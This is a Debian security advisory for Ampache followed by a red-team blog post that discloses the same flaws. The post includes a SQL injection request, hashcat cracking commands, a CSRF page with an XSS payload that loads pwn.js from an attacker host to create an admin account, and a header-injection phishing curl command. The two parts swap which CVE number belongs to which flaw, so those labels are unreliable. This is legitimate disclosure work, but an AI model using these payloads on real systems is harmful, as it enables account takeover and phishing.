Package        : ampache
Version        : 3.6-rzb2752+dfsg-5+deb8u1
CVE ID         : CVE-2019-12385 CVE-2019-12386

Several vulnerabilities were discovered in Ampache, a web-based audio
file management system.

CVE-2019-12385

    A stored XSS exists in the localplay.php LocalPlay "add instance"
    functionality. The injected code is reflected in the instances menu.
    This vulnerability can be abused to force an admin to create a new
    privileged user whose credentials are known by the attacker.

CVE-2019-12386

    The search engine is affected by a SQL Injection, so any user able
    to perform lib/class/search.class.php searches (even guest users)
    can dump any data contained in the database (sessions, hashed
    passwords, etc.). This may lead to a full compromise of admin
    accounts, when combined with the weak password generator algorithm
    used in the lostpassword functionality.

For Debian 8 "Jessie", these problems have been fixed in version
3.6-rzb2752+dfsg-5+deb8u1.

We recommend that you upgrade your ampache packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

During a [Red Team operation](https://www.tarlogic.com/red-team-services/), multiple vulnerabilities where discovered in [Ampache](https://ampache.org/), an open source web platform for audio/video streaming. CVE codes have been assigned for two of them: [CVE-2019-12385](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12385) (SQL injection) and [CVE-2019-12386](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12386) (stored XSS).

## Ampache SQL injection (CVE-2019-12385)

Communication with the database is made via the Dba class (ORM), which relays on PHP PDO to perform queries. Some of them are performed properly using prepared statements, but in other cases the **Dba::escape** method is used.

lib/class/dba.class.php:

```
134:    public static function escape($var)
135:    {
136:        $dbh = self::dbh();
137:        if (!$dbh) {
138:            debug_event('Dba', 'Wrong dbh.', 1);
139:            exit;
140:        }
141:        $var = $dbh->quote($var);
142:        // This is slightly less ugly than it was, but still ugly
143:        return substr($var, 1, -1);
144:    }

```

This function calls [PDO::quote](https://www.php.net/manual/en/pdo.quote.php), which filters special characters and quotes the string. After that, outer single quotes are stripped. The latter means that if this value is not quoted within the query, an attacker could inject data in SQL context.

A vulnerable case supporting this theory is detailed below, although there could be more.

lib/class/search.class.php:

```
1461:   case 'last_play':
1462:          $userid               = $GLOBALS['user']->id;
1463:          $where[]              = "`object_count`.`date` IS NOT NULL AND `object_count`.`date` $sql_match_operator (UNIX_TIMESTAMP() - ($input * 86400))";
1464:          $join['object_count'] = true;
1465:          break;

```

The **$input** variable is basically `Dba::escape($USER_INPUT)`, so a malicious user could provide SQL commands (avoiding quotes and other special chars).

The next request confirms the vulnerability, causing a 5-seconds delay:

```
POST /search.php?type=song
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8,pt;q=0.7
Cookie: ampache=[session_id]
Connection: close

limit=0&operator=or&rule_1=last_play&rule_1_operator=1&rule_1_input=1))union+select+1+from+dual+where+sleep(5)--&action=search

```

The searching engine is affected by this vulnerability, so any user able to perform searches (even guest users) could become administrator by stealing his session cookies (stored in the database). In the next section a way of privilege escalation when no active admin sessions exist will be exposed.

## Ampache Password generation

Regarding automatic password generation, we can remark two things:

### No use of salt

lib/class/user.class.php:

```
990:    public function update_password($new_password)
991:    {
992:        $new_password = hash('sha256', $new_password);
993:        $new_password = Dba::escape($new_password);
994:        $sql          = "UPDATE `user` SET `password` = ? WHERE `id` = ?";
995:        $db_results   = Dba::write($sql, array($new_password, $this->id));
996:        // Clear this (temp fix)
997:        if ($db_results) {
998:            unset($_SESSION['userdata']['password']);
990:        }
1000:   }

```

Passwords are directly hashed using sha256 without salting.

### Weak algorithm

The following function is used to generate pseudorandom passwords:

lib/general.lib.php:

```
47:    function generate_password($length)
48:    {
49:        $vowels     = 'aAeEuUyY12345';
50:        $consonants = 'bBdDgGhHjJmMnNpPqQrRsStTvVwWxXzZ6789';
51:        $password   = '';
52:        $alt = time() % 2;
53:        for ($i = 0; $i < $length; $i++) {
54:            if ($alt == 1) {
55:                $password .= $consonants[(rand(0, strlen($consonants) - 1))];
56:                $alt = 0;
57:            } else {
58:                $password .= $vowels[(rand(0, strlen($vowels) - 1))];
59:                $alt = 1;
60:            }
61:        }
62:        return $password;
63:    }

```

It can be seen how the function generates passwords using two short charsets (13 “vowels” & 36 “consonants”), choosing every character alternatively between them. Even worse: knowing the generation timestamp, we can infer the order of charsets used (due to the use of the [time](https://www.php.net/manual/es/function.time.php) function).

Also, as seen in lostpassword.php, new passwords generated via this method are 6 chars long only:

lostpassword.php

```
54:    if ($client && $client->email == $email) {
55:        $newpassword = generate_password(6);
56:        $client->update_password($newpassword);

```

This issues can be combined with the [SQL injection](https://www.tarlogic.com/cybersecurity-glossary/sql-injection/) to compromise an admin account in a few seconds:

1. Reset admin password
2. Using the SQL Injection: dump the hash of the password generated in the previous step
3. Crack it

It’s possible to crack it in a few seconds, using one of the following [hashcat](https://hashcat.net/hashcat/) commands (depending on the charsets’ order):

`.\hashcat64.exe -m 1400 -w 4 -a 3 ampache_hash_list.txt -1 aAeEuUyY12345 -2 bBdDgGhHjJmMnNpPqQrRsStTvVwWxXzZ6789 ?1?2?1?2?1?2 --outfile=ampache_result.txt -O`

or

`.\hashcat64.exe -m 1400 -w 4 -a 3 ampache_hash_list.txt -2 aAeEuUyY12345 -1 bBdDgGhHjJmMnNpPqQrRsStTvVwWxXzZ6789 ?1?2?1?2?1?2 --outfile=ampache_result.txt -O`

## Ampache CSRF + stored XSS (CVE-2019-12386)

In the feature of adding instances of localplay.php, two vulnerabilities appear: a CSRF ([https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_(CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)) and a stored XSS ([https://www.owasp.org/index.php/Cross-site\_Scripting\_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29)). These vulnerabilities can be combined to automatically force an admin to create a privileged account in the platform with a known password.

### Cross-Site Scripting

When rendering the “name” field of the instance, a HTML special characters are not properly escaped, thus after introducing HTML/JavaScript code, we can see how it’s loaded and executed in the browser. This way, it’s possible to force a user to perform specific actions within his session.

The following payload is enough to confirm the vulnerability: `<script>alert(1)</script>`

### Cross-Site Request Forgery

On the other hand, the same form doesn’t provide any protection against CSRF, so a new scenary is presented where an attacker could combine both vulnerabilities and force an admin to exploit the XSS against himself.

### PoC

A malicious user would just have to cheat an admin to visit a link hosting the following code:

index.html

```
<html>
  <body>
    <form action="https://[AMPACHE]/localplay.php?action=add_instance" method="POST">
      <input type="hidden" name="name" value="<script src=https://[ATTACKER]/pwn.js></script>" />
      <input type="hidden" name="host" value="foobar" />
      <input type="hidden" name="port" value="6666" />
      <input type="hidden" name="host" value="foobar" />
      <input type="hidden" name="port" value="9999" />
      <input type="hidden" name="password" value="foobar" />
      <input type="submit" value="Pwn!" />  <!-- Replace this with autosubmit stuff -->
    </form>
  </body>

```

pwn.js

```
function pwned() {
    var ifr = document.getElementById("pwn");
    var target = ifr.contentDocument.getElementsByTagName("form")[2];
    target.username.value = "NewAdmin";
    target.email.value = "myemail@tarlogic.foobar";
    target.password_1.value = "admin";
    target.password_2.value = "admin";
    target.access.value = "100";
    target.submit();
}
var iframe = document.createElement('iframe');
iframe.setAttribute("src", "https://[AMPACHE]/admin/users.php?action=show_add_user");
iframe.setAttribute("id", "pwn");
document.body.appendChild(iframe);
setTimeout(pwned, 3000);

```

Once an admin visits the page (index.html), a form would be automatically sent thus creating an instance whose name contains the XSS payload. After the form is submitted, the XSS would trigger and load the JavaScript code in pwn.js. The code in this file is responsible of creating a new admin account, controlled by the attacker.

## Ampache Reset mail manipulation

Another problem found is located in the reset password feature itself.

lostpassword.php

```
34:     $email = scrub_in($_POST['email']);
35:     $current_ip =(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) ? $_SERVER['HTTP_X_FORWARDED_FOR'] :$_SERVER['REMOTE_ADDR'];
36:     $result     = send_newpassword($email, $current_ip);
//...
$message  = sprintf(T_("A user from %s has requested a password reset for '%s'."), $current_ip, $client->username);

```

The contents of the X-Forwarded-For header is directly included in the email sent, so this could be perfect for phishing:

`curl https://[AMPACHE]/lostpassword.php --data "email=anyuser@tarlogic.foobar&action=send" --header "X-Forwarded-For: WE CAN MANIPULATE THIS TO LURE YOU"`

The user would receive the following email:

```
A user from WE CAN MANIPULATE THIS TO LURE YOU has requested a password reset for 'XXXX'.
The password has been set to:: jEX3WE

```
## Ampache Conclusion

One of the most standout characteristics of Tarlogic’s Red Team is its dedication to analyze the software used by its clients in order to find vulnerabilities that can be exploited in a real life scenario. These activities tend to result in the discovery of 0-days. Some of them that are found to be more interesting are shown in this blog (like the present post or as it was done with [OCS Inventory](https://www.tarlogic.com/blog/vulnerabilities-in-ocs-inventory-2-4-1/) and the [RCE of Cobian Backup](https://www.tarlogic.com/blog/cobian-backup-11-rce-cve-2017-11318/)) and others are only reported to the pertinent authorities (as it was done with the [Switch UbiQuoss VP5208A](https://www.tarlogic.com/blog/ubiquoss-switch-vulnerability-cve-2018-10024/)).

Always consider the possibility that an attacker uses unpublished vulnerabilities to compromise a machine. At this point, the measures implemented during the [hardening](https://www.tarlogic.com/operating-system-hardening/) phase should make lateral movement and escalation of privileges more difficult or even impossible. Likewise, the implementation of WAFs in this type of critical internal applications can prevent or make much more complicated to exploit this kind of web application vulnerabilities.
